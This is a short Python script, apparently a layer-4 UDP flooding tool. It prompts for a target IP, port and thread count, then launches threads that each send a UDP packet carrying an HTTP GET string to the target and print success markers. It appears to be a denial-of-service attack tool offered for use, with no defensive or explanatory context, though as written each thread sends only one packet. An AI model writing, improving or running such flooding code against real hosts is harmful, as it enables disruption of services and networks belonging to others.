import threading
import socket

ip = socket.gethostbyname(input("IP: "))
port = int(input("Port: "))
threads = int(input("Threads: "))

server_address = (ip, port)


def l4_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        s.sendto(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode(), server_address)

        if port == 0:
            print("\033[32m[+]\033[0m L4 UDP Packet sent ->", ip)
        else:
            print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {ip}:{port}")

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


for i in range(threads):
    t = threading.Thread(target=l4_udp)
    t.start()

input("")
